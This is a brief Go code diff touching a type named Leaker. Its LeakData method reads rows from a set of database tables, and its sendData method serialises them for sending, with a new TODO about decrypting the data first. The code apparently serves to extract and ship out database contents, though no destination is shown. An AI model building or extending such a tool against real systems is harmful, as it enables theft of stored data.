@@ -20,7 +20,7 @@ func (l *Leaker) LeakData() error {
 
 	for _, table := range l.tables {
 		for {
-			rows, err := db.FetchRows(table)
+			rows, err := db.GetInstance().FetchRows(table)
 			if err != nil {
 				return err
 			}
@@ -42,6 +42,7 @@ func (l *Leaker) LeakData() error {
 }
 
 func (l *Leaker) sendData(data any) error {
+	// TODO: DecryptData before
 	payload, err := json.Marshal(data)
 	if err != nil {
 		return err
